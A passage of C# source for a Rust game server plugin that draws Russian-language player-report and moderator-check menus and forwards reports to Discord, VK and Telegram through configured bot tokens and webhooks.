                                    $"{0.03278887} {0.8387395 - Math.Floor((double) players.B / 1) * 0.058}",
                                AnchorMax = $"{0.976581} {0.8923218 - Math.Floor((double) players.B / 1) * 0.058}"
                            }
                        }
                    });
                }
                else
                {

                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Mod",
                        Name = Layer + "Mod" + players.B,
                        Components =
                        {
                            new CuiImageComponent()
                            {
                                Color = "0.35 0.35 0.35 0.45",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin =
                                    $"{0.03278887} {0.8387395 - Math.Floor((double) players.B / 1) * 0.058}",
                                AnchorMax = $"{0.976581} {0.8923218 - Math.Floor((double) players.B / 1) * 0.058}"
                            }
                        }
                    });
                }

                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Mod" + players.B,
                    Components =
                    {
                        new CuiRawImageComponent() {Png = GetImage(target.UserIDString)},
                        new CuiRectTransformComponent() {AnchorMin = "0 0", AnchorMax = "0.1464023 0.9851253"}
                    }
                });
                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Mod" + players.B,
                    Components =
                    {
                        new CuiTextComponent()
                        {
                            Text = $" {target.displayName.ToUpper()}", Align = TextAnchor.MiddleLeft,
                            FontSize = 16
                        },
                        new CuiRectTransformComponent()
                            {AnchorMin = "0.1994236 0.2736453", AnchorMax = "1.003585 0.9851253"}
                    }
                });
                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Mod" + players.B,
                    Components =
                    {
                        new CuiTextComponent()
                        {
                            Text = $"  {target.userID}", Color = "0.64 0.64 0.64 0.64",
                            Align = TextAnchor.UpperLeft, FontSize = 10, Font = regular
                        },
                        new CuiRectTransformComponent()
                            {AnchorMin = "0.1994236 0.01242494", AnchorMax = "1.003585 0.4013513"}
                    }
                });
                cont.Add(new CuiButton()
                {
                    Button =
                    {
                        Color = "0.64 0.64 0.64 0.86", Command = $"UISoReport profile {target.userID}",
                        Sprite = "assets/icons/tools.png"
                    },
                    RectTransform = {AnchorMin = "0.8615944 0", AnchorMax = "0.9975222 1"},
                    Text = {Text = ""}
                }, Layer + "Mod" + players.B);
            }

            CuiHelper.AddUi(player, cont);
        }

        private void LoadProfile(BasePlayer player, ulong targetId)
        {
            PlayerData f;
            if (!_playerData.TryGetValue(targetId, out f)) return;
            var cont = new CuiElementContainer();
            CuiHelper.DestroyUi(player, Layer + "Profile");
            cont.Add(_mod2Panel, Layer + "Main", Layer + "Profile");
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Profile",
                Components =
                {
                    new CuiTextComponent()
                        {Align = TextAnchor.MiddleCenter, Text = f.UserName.ToUpper(), FontSize = 25},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.03270523 0.9434662", AnchorMax = "0.927317 0.9870253"}
                }
            });
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Profile",
                Components =
                {
                    new CuiRawImageComponent() {Png = GetImage(targetId.ToString())},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.3160769 0.8257645", AnchorMax = "0.6369192 0.9416128"}
                }
            });
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Profile",
                Components =
                {
                    new CuiTextComponent()
                    {
                        Align = TextAnchor.MiddleCenter, Text = "Кол-во репортов: " + f.ReportCount,
                        Color = "0.64 0.64 0.64 0.64", FontSize = 10
                    },
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.316077 0.7886934", AnchorMax = "0.6369191 0.8239112"}
                }
            });
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Profile",
                Components =
                {
                    new CuiTextComponent()
                    {
                        Align = TextAnchor.MiddleCenter, Text = "Кол-во проверок: " + f.AlertCount,
                        Color = "0.64 0.64 0.64 0.64", FontSize = 10
                    },
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.316077 0.7738647", AnchorMax = "0.6369191 0.8090826"}
                }
            });
            cont.Add(new CuiButton()
            {
                Button = {Color = "0.65 0.65 0.65 0.45", Command = $"uisoreport alert {targetId}"},
                Text =
                {
                    Text = "ВЫЗВАТЬ НА ПРОВЕРКУ", Color = "0.64 0.64 0.64 0.87", Align = TextAnchor.MiddleCenter
                },
                RectTransform = {AnchorMin = "0.09125336 0.7442076", AnchorMax = "0.8570592 0.7738647"}
            }, Layer + "Profile");
            cont.Add(new CuiButton()
            {
                Button = {Color = "1 1 1 1", Sprite = "assets/icons/circle_open.png", Close = Layer + "Profile"},
                Text = {Text = ""},
                RectTransform = {AnchorMin = "0.4120954 0.7015755", AnchorMax = "0.5151403 0.7405006"}
            }, Layer + "Profile");
            cont.Add(new CuiButton()
            {
                Button = {Color = "1 1 1 1", Sprite = "assets/icons/vote_down.png", Close = Layer + "Profile"},
                Text = {Text = ""},
                RectTransform = {AnchorMin = "0.4120954 0.7015755", AnchorMax = "0.5151403 0.7405006"}
            }, Layer + "Profile");
            CuiHelper.AddUi(player, cont);
        }

        private void ReportFon(BasePlayer player)
        {
            var cont = new CuiElementContainer();
            List<ulong> f;
            CuiHelper.DestroyUi(player, Layer + "Red");
            cont.Add(_redPanel, Layer + "Main", Layer + "Red");
            //Лейбл
            PlayerData playerData;
            if (!_playerData.TryGetValue(player.userID, out playerData)) return;
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Red",
                Components =
                {
                    new CuiTextComponent() {Text = "РЕПОРТ", Color = "0.64 0.64 0.64 0.86", FontSize = 30},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.03044713 0.9258574", AnchorMax = "0.9742392 0.9766592"}
                }
            });
            if (playerData.IsCooldown > 0)
            {
                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Red",
                    Components =
                    {
                        new CuiTextComponent()
                        {
                            Text = "Подождите: " + FormatTime(TimeSpan.FromSeconds(playerData.IsCooldown), "ru"),
                            Color = "0.64 0.64 0.64 0.86", FontSize = 15, Align = TextAnchor.MiddleRight, Font = regular
                        },
                        new CuiRectTransformComponent()
                            {AnchorMin = "0.03044713 0.9258574", AnchorMax = "0.9742392 0.9766592"}
                    }
                });
            }

            //Инфо
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Red",
                Components =
                {
                    new CuiTextComponent()
                    {
                        Text = "Не забывайте что жалобу можно отравить не только на <b>одного человека</b>, а сразу на <b>шестерых</b>.", Color = "0.64 0.64 0.64 0.86", FontSize = 12,
                        Font = regular
                    },
                    new CuiRectTransformComponent() {AnchorMin = "0.03513062 0.146427", AnchorMax = "0.976581 0.214087"}
                }
            });
            //Первая причина
            cont.Add(new CuiButton()
            {
                Text = {Text = cfg.res1, Color = "0.64 0.64 0.64 0.86", Align = TextAnchor.MiddleCenter},
                Button = {Color = "0 0 0 0.64", Command = $"UiSoReport reportsend {cfg.res1}"},
                RectTransform = {AnchorMin = "0.03747275 0.07877186", AnchorMax = "0.4941462 0.1390175"}
            }, Layer + "Red");
            //Вторая причина
            cont.Add(new CuiButton()
            {
                Text = {Text = cfg.res2, Color = "0.64 0.64 0.64 0.86", Align = TextAnchor.MiddleCenter},
                Button = {Color = "0 0 0 0.64", Command = $"UiSoReport reportsend {cfg.res2}"},
                RectTransform = {AnchorMin = "0.5128826 0.07877186", AnchorMax = "0.9695571 0.1390175"}
            }, Layer + "Red");
            //3 причина
            cont.Add(new CuiButton()
            {
                Text = {Text = cfg.res3, Color = "0.64 0.64 0.64 0.86", Align = TextAnchor.MiddleCenter},
                Button = {Color = "0 0 0 0.64", Command = $"UiSoReport reportsend {cfg.res3}"},
                RectTransform = {AnchorMin = "0.5128826 0.01204333", AnchorMax = "0.9695571 0.07228888"}
            }, Layer + "Red");
            //4 причина
            cont.Add(new CuiButton()
            {
                Text = {Text = cfg.res4, Color = "0.64 0.64 0.64 0.86", Align = TextAnchor.MiddleCenter},
                Button = {Color = "0 0 0 0.64", Command = $"UiSoReport reportsend {cfg.res4}"},
                RectTransform = {AnchorMin = "0.03981462 0.01204333", AnchorMax = "0.4964881 0.07228888"}
            }, Layer + "Red");
            if (_reportList.TryGetValue(player.userID, out f))
            {
                foreach (var players in f.Select((i, t) => new {A = i, B = t}))
                {
                    var target = BasePlayer.FindByID(players.A);
                    if (target == null) continue;
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Red",
                        Name = Layer + "Red" + players.B,
                        Components =
                        {
                            new CuiImageComponent()
                            {
                                Color = "0.64 0.64 0.64 0.45",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin =
                                    $"{0.03278887} {0.8387395 - Math.Floor((double) players.B / 1) * 0.058}",
                                AnchorMax = $"{0.976581} {0.8923218 - Math.Floor((double) players.B / 1) * 0.058}"
                            }
                        }
                    });
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Red" + players.B,
                        Components =
                        {
                            new CuiRawImageComponent() {Png = GetImage(target.UserIDString)},
                            new CuiRectTransformComponent() {AnchorMin = "0 0", AnchorMax = "0.1464023 0.9851253"}
                        }
                    });
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Red" + players.B,
                        Components =
                        {
                            new CuiTextComponent()
                            {
                                Text = $" {target.displayName.ToUpper()}", Align = TextAnchor.MiddleLeft,
                                FontSize = 16
                            },
                            new CuiRectTransformComponent()
                                {AnchorMin = "0.1994236 0.2736453", AnchorMax = "1.003585 0.9851253"}
                        }
                    });
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Red" + players.B,
                        Components =
                        {
                            new CuiTextComponent()
                            {
                                Text = $"  {target.userID}", Color = "0.64 0.64 0.64 0.64",
                                Align = TextAnchor.UpperLeft, FontSize = 10, Font = regular
                            },
                            new CuiRectTransformComponent()
                                {AnchorMin = "0.1994236 0.01242494", AnchorMax = "1.003585 0.4013513"}
                        }
                    });
                    cont.Add(new CuiButton()
                    {
                        Button =
                        {
                            Color = "0.64 0.64 0.64 0.86", Command = $"UISoReport remove {target.userID}",
                            Sprite = "assets/icons/vote_down.png"
                        },
                        RectTransform = {AnchorMin = "0.8515944 0", AnchorMax = "0.9975222 1"},
                        Text = {Text = ""}
                    }, Layer + "Red" + players.B);
                }
            }

            CuiHelper.AddUi(player, cont);
        }

        private void PlayerListLoad(BasePlayer player, int page, string find = "")
        {
            var cont = new CuiElementContainer();
            CuiHelper.DestroyUi(player, Layer + "Players");
            cont.Add(_playersPanel, Layer + "Main", Layer + "Players");
            ;
            if (page > 1)
            {
                cont.Add(new CuiButton()
                {
                    Button =
                    {
                        Command = $"uisoreport nextpage players {page - 1}", Color = HexToRustFormat("#4b602aCC")
                    },
                    Text = {Text = "<", Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                    RectTransform = {AnchorMin = "0.4305381 0.01297505", AnchorMax = "0.4722021 0.05097298"}
                }, Layer + "Players");
            }
            else
            {
                cont.Add(new CuiButton()
                {
                    Button = {Command = $"", Color = HexToRustFormat($"#24291dCC")},
                    Text = {Text = "<", Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                    RectTransform = {AnchorMin = "0.4305381 0.01297505", AnchorMax = "0.4722021 0.05097298"}
                }, Layer + "Players");
            }

            cont.Add(new CuiButton()
            {
                Button = {Color = "0 0 0 0.64"},
                Text =
                    {Text = page.ToString(), Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                RectTransform = {AnchorMin = "0.4786112 0.01297505", AnchorMax = "0.5202752 0.05097298"}
            }, Layer + "Players");
            cont.Add(new CuiButton()
            {
                Button =
                    {Command = $"uisoreport nextpage players {page + 1}", Color = HexToRustFormat("#4b602aCC")},
                Text = {Text = ">", Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                RectTransform = {AnchorMin = "0.5256162 0.01297505", AnchorMax = "0.5672802 0.05097298"}
            }, Layer + "Players");
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Players",
                Components =
                {
                    new CuiTextComponent() {Text = "НАЙДИ ИГРОКА(-ОВ)", Color = "0.64 0.64 0.64 0.86", FontSize = 15},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.02672157 0.9277115", AnchorMax = "0.3984902 0.9785135"}
                }
            });
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Players",
                Components =
                {
                    new CuiTextComponent()
                        {Text = "НА КОТОРОГО ХОЧЕШЬ ПОЖАЛОВАТЬСЯ", Color = "0.64 0.64 0.64 0.34", FontSize = 9},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.02776662 0.9341984", AnchorMax = "0.3963884 0.9564412"}
                }
            });
            //Инфо
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Players",
                Components =
                {
                    new CuiImageComponent() {Color = "0.64 0.64 0.64 0.35"},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.5256127 0.936052", AnchorMax = "0.9710997 0.9785135"}
                }
            });
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Players",
                Components =
                {
                    new CuiTextComponent()
                    {
                        Text = "   НАЙТИ ИГРОКА ПО НИКУ/STEAMID", Align = TextAnchor.MiddleLeft,
                        Color = "0.64 0.64 0.64 0.10"
                    },
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.5256127 0.936052", AnchorMax = "0.9710997 0.9785135"}
                }
            });

            cont.Add(new CuiElement()
            {
                Parent = Layer + "Players",
                Components =
                {
                    new CuiInputFieldComponent()
                    {
                        Text = "", Color = "0.64 0.64 0.64 0.64", Align = TextAnchor.MiddleLeft,
                        Command = $"UISoReport find {page} "
                    },
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.5256127 0.936052", AnchorMax = "0.9710997 0.9785135"}
                }
            });
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Players",
                Components =
                {
                    new CuiImageComponent()
                    {
                        Sprite = "assets/icons/examine.png",
                        Color = "0.64 0.64 0.64 0.64"
                    },
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.9207384 0.936052", AnchorMax = "0.9710997 0.9785135"}
                }
            });
            if (find != "" && BasePlayer.Find(find) != null)
            {
                var targetPlayer = BasePlayer.Find(find);
                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Players",
                    Name = Layer + "Players" + "0",
                    Components =
                    { 
                        new CuiImageComponent() {Color = "0.64 0.64 0.64 0.25"},
                        new CuiRectTransformComponent
                        {
                            AnchorMin =
                                "0.02964282 0.8609824",
                            AnchorMax =
                                "0.3365291 0.9117843"
                        }
                    }
                });

                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Players" + "0",
                    Components =
                    {
                        new CuiRawImageComponent() {Png = GetImage(targetPlayer.UserIDString)},
                        new CuiRectTransformComponent() {AnchorMin = "0 0", AnchorMax = "0.199423 0.9851253"}
                    }
                });
                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Players" + "0",
                    Components =
                    {
                        new CuiTextComponent()
                        {
                            Text = $" {targetPlayer.displayName.ToUpper()}", Align = TextAnchor.MiddleLeft,
                            FontSize = 16
                        },
                        new CuiRectTransformComponent()
                            {AnchorMin = "0.1994236 0.2736453", AnchorMax = "1.003585 0.9851253"}
                    }
                });
                cont.Add(new CuiElement()
                {
                    Parent = Layer + "Players" + "0",
                    Components =
                    {
                        new CuiTextComponent()
                        {
                            Text = $"  {targetPlayer.userID}", Color = "0.64 0.64 0.64 0.64",
                            Align = TextAnchor.UpperLeft, FontSize = 10, Font = regular
                        },
                        new CuiRectTransformComponent()
                            {AnchorMin = "0.1994236 0.01242494", AnchorMax = "1.003585 0.4013513"}
                    }
                });

                cont.Add(new CuiButton()
                {
                    Button = {Color = "0 0 0 0", Command = $"UISoReport add {page} {targetPlayer.userID}"},
                    RectTransform = {AnchorMin = "0 0", AnchorMax = "1 1"},
                    Text = {Text = ""}
                }, Layer + "Players" + "0");
            }
            else
            {
                foreach (var players in BasePlayer.activePlayerList
                    .Select((i, t) => new {A = i, B = t - (page - 1) * 45}).Skip((page - 1) * 45).Take(45))
                {
                    List<ulong> f;
                    if (_reportList.TryGetValue(player.userID, out f) && f.Contains(players.A.userID))
                    {
                        cont.Add(new CuiElement()
                        {
                            Parent = Layer + "Players",
                            Name = Layer + "Players" + players.B,
                            Components =
                            {
                                new CuiImageComponent()
                                {
                                    Color = HexToRustFormat("#93c9415a")
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin =
                                        $"{0.02964282 + players.B * 0.315 - Math.Floor((double) players.B / 3) * 3 * 0.315} {0.8609824 - Math.Floor((double) players.B / 3) * 0.058}",
                                    AnchorMax =
                                        $"{0.3365291 + players.B * 0.315 - Math.Floor((double) players.B / 3) * 3 * 0.315} {0.9117843 - Math.Floor((double) players.B / 3) * 0.058}"
                                }
                            }
                        });
                    }
                    else
                    {
                        cont.Add(new CuiElement()
                        {
                            Parent = Layer + "Players",
                            Name = Layer + "Players" + players.B,
                            Components =
                            {
                                new CuiImageComponent()
                                    {Color = "0.64 0.64 0.64 0.25"},
                                new CuiRectTransformComponent
                                {
                                    AnchorMin =
                                        $"{0.02964282 + players.B * 0.315 - Math.Floor((double) players.B / 3) * 3 * 0.315} {0.8609824 - Math.Floor((double) players.B / 3) * 0.058}",
                                    AnchorMax =
                                        $"{0.3365291 + players.B * 0.315 - Math.Floor((double) players.B / 3) * 3 * 0.315} {0.9117843 - Math.Floor((double) players.B / 3) * 0.058}"
                                }
                            }
                        });
                    }

                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Players" + players.B,
                        Components =
                        {
                            new CuiRawImageComponent() {Png = GetImage(players.A.UserIDString)},
                            new CuiRectTransformComponent() {AnchorMin = "0 0", AnchorMax = "0.199423 0.9851253"}
                        }
                    });
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Players" + players.B,
                        Components =
                        {
                            new CuiTextComponent()
                            {
                                Text = $" {players.A.displayName.ToUpper()}", Align = TextAnchor.MiddleLeft,
                                FontSize = 16
                            },
                            new CuiRectTransformComponent()
                                {AnchorMin = "0.1994236 0.2736453", AnchorMax = "1.003585 0.9851253"}
                        }
                    });
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Players" + players.B,
                        Components =
                        {
                            new CuiTextComponent()
                            {
                                Text = $"  {players.A.userID}", Color = "0.64 0.64 0.64 0.64",
                                Align = TextAnchor.UpperLeft, FontSize = 10, Font = regular
                            },
                            new CuiRectTransformComponent()
                                {AnchorMin = "0.1994236 0.01242494", AnchorMax = "1.003585 0.4013513"}
                        }
                    });
                    cont.Add(new CuiButton()
                    {
                        Button = {Color = "0 0 0 0", Command = $"UISoReport add {page} {players.A.userID}"},
                        RectTransform = {AnchorMin = "0 0", AnchorMax = "1 1"},
                        Text = {Text = ""}
                    }, Layer + "Players" + players.B);
                }
            }

            CuiHelper.AddUi(player, cont);
        }

        #endregion

        #region Commands

        [ChatCommand("discord")]
        private void SayDiscord(BasePlayer player, string c, string[] a)
        {
            if (!_alertList.ContainsValue(player.userID))
            {
                ReplySend(player, "Вы не на проверке!");
                return;
            }
            if (a.Length < 1)
            {
                ReplySend(player, "/discord {ВАШ ДИСКОРД}");
                return;
            }
            var arg = string.Join(" ", a.ToArray());
            var admin = BasePlayer.FindByID(_alertList.First(p => p.Value == player.userID).Key);
            ReplySend(player, "Дискорд успешно отправлен!");
            if (admin != null)
                ReplySend(admin, $"Игрок {player.displayName}[{player.userID}] отправил свой дискорд: {arg}");
            if (cfg.Vkontakte) 
                webrequest.Enqueue( 
                    "https://api.vk.com/method/messages.send?user_ids=" + cfg.vkadmin + "&message=" + $"Игрок {player.displayName}[{player.userID}] отправил свой дискорд: {arg}" +
                    "&v=5.92" + "&random_id=" + UnityEngine.Random.Range(Int32.MinValue, Int32.MaxValue) +
                    "&access_token=" + cfg.vkAcces, null, (code, response) => { }, this);
            if(cfg.TelegramUse) webrequest.Enqueue($"https://api.telegram.org/bot{cfg.botToken}/sendMessage?chat_id=@{cfg.chatid}&text=Игрок {player.displayName}[{player.userID}] отправил свой дискорд: {arg}", null, (code, response) => { if(code == 400) Puts("Chat not found");},this, RequestMethod.POST);
            if (cfg.discord) SendDiscord("SendPlayerDiscord", $"Игрок {player.displayName}[{player.userID}] отправил свой дискорд: {arg}", cfg.discordhook2);
        }

        [ConsoleCommand("UISoReport")]
        private void SoCommands(ConsoleSystem.Arg arg)
        {
            var targetPlayer = arg.Player();
            switch (arg.Args[0])
            {
                case "nextpage":
                    if (arg.Args[1] == "players")
                        PlayerListLoad(targetPlayer, arg.Args[2].ToInt());
                    if (arg.Args[1] == "mod")
                        ModeratorInterface(targetPlayer, arg.Args[2].ToInt());
                    break;
                case "alert":
                    ulong ss;
                    if (_alertList.TryGetValue(targetPlayer.userID, out ss))
                    {
                        var target = BasePlayer.FindByID(ss);
                        ReplySend(target, $"Проверка окончена!");
                        ReplySend(targetPlayer, $"Вы закончили проверку игрока {target.displayName}");
                        CuiHelper.DestroyUi(target, "AlerUISo");
                        _alertList.Remove(targetPlayer.userID);
                    }
                    else if (!_alertList.ContainsValue(ulong.Parse(arg.Args[1])))
                    {
                        PlayerData data;
                        if (!_playerData.TryGetValue(ulong.Parse(arg.Args[1]), out data)) return;
                        data.AlertCount += 1;
                        _alertList.Add(targetPlayer.userID, ulong.Parse(arg.Args[1]));
                        Alert(ulong.Parse(arg.Args[1]));
                    }

                    break;
                case "find":
                    if(arg.Args.Length < 3) return;
                    PlayerListLoad(targetPlayer, arg.Args[1].ToInt(), arg.Args[2]);
                    break;
                case "add":
                    List<ulong> f;

                    if (_reportList.TryGetValue(targetPlayer.userID, out f))
                    {
                        if (!f.Contains(ulong.Parse(arg.Args[2])))
                            if (f.Count < 6)
                                f.Add(ulong.Parse(arg.Args[2]));
                    }
                    else
                        _reportList.Add(targetPlayer.userID, new List<ulong>()
                        {
                            ulong.Parse(arg.Args[2]),
                        });

                    PlayerListLoad(targetPlayer, arg.Args[1].ToInt());
                    ReportFon(targetPlayer);
                    break;
                case "remove":
                    if (_reportList.TryGetValue(targetPlayer.userID, out f))
                        f.Remove(ulong.Parse(arg.Args[1]));

                    PlayerListLoad(targetPlayer, 1);
                    ReportFon(targetPlayer);
                    break;
                case "reportsend":
                    PlayerData playerDat;
                    if (!_playerData.TryGetValue(targetPlayer.userID, out playerDat)) return;
                    if (playerDat.IsCooldown > 0) return;
                    if (_reportList.TryGetValue(targetPlayer.userID, out f))
                    {
                        string text =
                            $"Игрок {targetPlayer.displayName}[{targetPlayer.userID}] пожаловался по причине {arg.Args[1]} на игрока(-ов):";
                        if (f.Count < 1) return;
                        foreach (var reportSend in f)
                        {
                            var target = BasePlayer.FindByID(reportSend);
                            if (target == null) continue;
                            PlayerData dataPlayer;
                            if (_playerData.TryGetValue(target.userID, out dataPlayer))
                            {
                                dataPlayer.ReportCount += 1;
                                text +=
                                    $"\n{target.displayName} [{target.userID}] \nКол-во репортов: {dataPlayer.ReportCount}\nSteam: [КЛИК](https://steamcommunity.com/profiles/{target.userID})";
                            }
                        }

                        f.Clear();
                        if (cfg.discord) SendDiscord("REPORT", text, cfg.discordhook);
                        if (cfg.Vkontakte) webrequest.Enqueue("https://api.vk.com/method/messages.send?user_ids=" + cfg.vkadmin + "&message=" + text + "&v=5.92" + "&random_id=" + UnityEngine.Random.Range(Int32.MinValue, Int32.MaxValue) + "&access_token=" + cfg.vkAcces, null, (code, response) => { }, this);
                        if(cfg.TelegramUse) webrequest.Enqueue($"https://api.telegram.org/bot{cfg.botToken}/sendMessage?chat_id=@{cfg.chatid}&text={text}", null, (code, response) => { if(code == 400) Puts("Chat not found");},this, RequestMethod.POST);
                        Puts(text);
                        playerDat.ReportCD = cfg.cooldown + CurrentTime();
                    }

                    PlayerListLoad(targetPlayer, 1);
                    ReportFon(targetPlayer);
                    break;
                case "modmenu":
                    if (arg.Args[1] == "open")
                    {
                        CuiHelper.DestroyUi(targetPlayer, Layer + "BMod");
                        ModeratorInterface(targetPlayer, 1);
                    }

                    break;
                case "profile":
                    LoadProfile(targetPlayer, ulong.Parse(arg.Args[1]));
                    break;
            }
        }
        [ChatCommand("alert")]
        private void AlertCommand(BasePlayer player, string c, string[] a)
        {
            if (permission.UserHasPermission(player.UserIDString, "soreport.admin"))
            {
                if (a.Length < 1)
                {
                    ReplySend(player, "/alert {НИК/STEAMID}");
                    return;
                }

                var arg = String.Join(" ", a.ToArray());
                var target = BasePlayer.Find(arg);
                if (target == null)
                {
                    ReplySend(player, "Игрок не найден");
                    return;
                }

                ulong ss;
                if (_alertList.TryGetValue(player.userID, out ss))
                {
                    _alertList.Remove(player.userID);
                    var targes = BasePlayer.FindByID(ss);
                    CuiHelper.DestroyUi(targes, "AlerUISo");
                    
                    ReplySend(targes, $"Проверка окончена!");
                    ReplySend(player, $"Вы закончили проверку игрока {targes.displayName}");
                    return;
                }
                PlayerData data;
                if(!_playerData.TryGetValue(target.userID, out data)) return;
                data.AlertCount += 1;
                _alertList.Add(player.userID, target.userID);
                Alert(target.userID);
                ReplySend(player, $"Вы вызвали игрока {target.displayName} на проверку");
            }
        }

        #endregion
        
        #region DS

        #region discord

        private readonly JsonSerializerSettings _jsonSettings = new JsonSerializerSettings();
        private static SoReport _instance;

        private readonly Dictionary<string, string> _headers = new Dictionary<string, string>
        {
            ["Content-Type"] = "application/json"
        };

        private class FancyMessage
        {
            [JsonProperty("content")] private string Content { get; set; }
            [JsonProperty("tts")] private bool TextToSpeech { get; set; }
            [JsonProperty("embeds")] private EmbedBuilder[] Embeds { get; set; }

            public FancyMessage WithContent(string value)
            {
                Content = value;
                return this;
            }

            public FancyMessage SetEmbed(EmbedBuilder value)
            {
                Embeds = new[] {value};
                return this;
            }

            public string ToJson()
            {
                return JsonConvert.SerializeObject(this, _instance._jsonSettings);
            }
        }

        public class EmbedBuilder
        {
            public EmbedBuilder()
            {
                Fields = new List<Field>();
            }

            [JsonProperty("title")] private string Title { get; set; }
            [JsonProperty("color")] private int Color { get; set; }
            [JsonProperty("fields")] private List<Field> Fields { get; }

            public EmbedBuilder WithTitle(string title)
            {
                Title = title;
                return this;
            }

            public EmbedBuilder SetColor(int color)
            {
                Color = color;
                return this;
            }

            public EmbedBuilder AddField(Field field)
            {
                Fields.Add(field);
                return this;
            }

            public class Field
            {
                public Field(string name, object value)
                {
                    Name = name;
                    Value = value;
                }

                [JsonProperty("name")] public string Name { get; set; }
                [JsonProperty("value")] public object Value { get; set; }
            }
        }

        private class Request
        {
            private readonly string _payload;
            private readonly Plugin _plugin;
            private readonly string _url;

            public void Send()
            {
                _instance.webrequest.Enqueue(_url, _payload, (code, rawResponse) => { }, _instance, RequestMethod.POST,
                    _instance._headers);
            }

            public static void Send(string url, FancyMessage message, Plugin plugin = null)
            {
                new Request(url, message, plugin).Send();
            }

            private Request(string url, FancyMessage message, Plugin plugin = null)
            {
                _url = url;
                _payload = message.ToJson();
                _plugin = plugin;
            }
        }

        #endregion

        private void SendDiscord(string type, string reason, string hook)
        {
            var fields = new List<EmbedBuilder.Field>();
            fields.Add(new EmbedBuilder.Field(type, reason));
            var serializedObject = JsonConvert.SerializeObject(fields);
            var builder = new EmbedBuilder().SetColor(104403);
            foreach (var field in JsonConvert.DeserializeObject<EmbedBuilder.Field[]>(serializedObject))
                builder.AddField(field);
            var payload = new FancyMessage().WithContent(cfg.Lable).SetEmbed(builder);
            Request.Send(hook, payload, this);
        }

        #endregion

        #region L

        private Dictionary<ulong, ulong> _alertList = new Dictionary<ulong, ulong>();
        private Dictionary<ulong, List<ulong>> _reportList = new Dictionary<ulong, List<ulong>>();

        #endregion

        #region Hooks

        private void OnPlayerConnected(BasePlayer player)
        {
            if (!_playerData.ContainsKey(player.userID))
                _playerData.Add(player.userID, new PlayerData() {UserName = player.displayName, ReportCount = 1});
        }

        private void OnServerInitialized()
        {
            permission.RegisterPermission("soreport.admin", this);
            _instance = this;

            if (Interface.Oxide.DataFileSystem.ExistsDatafile("TryReport/Report"))
                _playerData =
                    Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, PlayerData>>("SoReport/Players");
            foreach (var basePlayer in BasePlayer.activePlayerList)
            {
                OnPlayerConnected(basePlayer);
            }
        }

        private void Unload()
        {
            Interface.Oxide.DataFileSystem.WriteObject("SoReport/Players", _playerData);
            foreach (var basePlayer in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(basePlayer, Layer);
                CuiHelper.DestroyUi(basePlayer, "AlerUISo");
            }
        }

        #endregion

        #region Help

        private static string Format(int units, string form1, string form2, string form3)
        {
            var tmp = units % 10;
            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9) return $"{units} {form1}";
            if (tmp >= 2 && tmp <= 4) return $"{units} {form2}";
            return $"{units} {form3}";
        }

        public static string FormatTime(TimeSpan time, string language, int maxSubstr = 5)
        {
            var result = string.Empty;
            switch (language)
            {
                case "ru":
                    var i = 0;
                    if (time.Days != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Days, "дней", "дня", "день")}";
                        i++;
                    }

                    if (time.Hours != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Hours, "часов", "часа", "час")}";
                        i++;
                    }

                    if (time.Minutes != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Minutes, "минут", "минуты", "минута")}";
                        i++;
                    }

                    if (time.Seconds != 0 && i < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Seconds, "сек", "сек", "сек")}";
                        i++;
                    }

                    break;
                case "en":
                {
                    var i2 = 0;
                    if (time.Days != 0 && i2 < maxSubstr)
                    {
                        if (!string.IsNullOrEmpty(result)) result += " ";
                        result += $"{Format(time.Days, "days'", "day's", "day")}";
                        i2++;
                    }

                    if (time.Hours != 0 && i2 < maxSubstr)
                    {
